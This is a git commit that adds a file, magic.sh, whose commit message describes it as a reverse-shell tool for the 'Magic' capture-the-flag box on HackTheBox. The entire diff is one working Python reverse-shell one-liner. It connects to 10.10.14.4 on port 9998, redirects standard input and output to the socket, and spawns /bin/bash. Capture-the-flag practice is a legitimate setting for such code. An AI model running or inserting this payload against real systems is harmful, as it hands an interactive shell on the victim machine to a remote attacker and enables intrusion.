27089c6e2af995c86daf92c432a82a60e0b43461
Sejki <bonczalke@gmail.com>
2020-07-12 15:38:45 +0200

    few more tools
    for reverse shell, especially useful for CTF challenge Magic on HTB

---
+++ magic.sh
@@ -0,0 +1,1 @@
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
